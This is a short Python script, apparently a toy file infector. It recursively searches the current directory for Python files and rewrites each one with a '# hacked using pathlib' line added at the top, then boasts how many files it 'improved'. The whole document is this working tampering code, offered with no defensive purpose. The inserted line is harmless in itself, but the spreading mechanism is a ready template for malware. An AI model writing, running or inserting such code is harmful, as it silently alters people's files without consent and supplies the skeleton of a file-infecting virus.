import os
from pathlib import Path

#the message to spread
message = "# hacked using pathlib\n"

#in order to avoid this file from being affected, store the file name of this python script
#this could be better if basename was replaced, and check if __file__ is the same as the file being searched
scriptfilename = os.path.basename(__file__)

cwd = Path.cwd()

def find(pathobj):
    #print("path is", str(pathobj))
    result = []
    isFile = pathobj.is_file()
    isDir = pathobj.is_dir()
    if isFile == True:
        if pathobj.suffix == ".py" and pathobj.name != scriptfilename:
            result.append(pathobj)
    elif isDir == True:
        #get entries
        entries = list(pathobj.iterdir())
        for entry in entries:
            #use / to join Paths together
            result.extend(find(pathobj / entry.name))

    return result

def spread(pathobjlist):
    filesSpread = int(0)
    for pathobj in pathobjlist:
        filepath = str(pathobj)
        f = open(filepath, "r")
        content = f.read()
        f.close()

        f = open(filepath, "w")
        f.write(message+content)
        f.close()
        print(f"successfully put message in {pathobj.name} ({filepath})")
        filesSpread += 1
    print(str(filesSpread) + " FILES HAVE BEEN IMPROVED")

filestoimprove = find(cwd)

spread(filestoimprove)
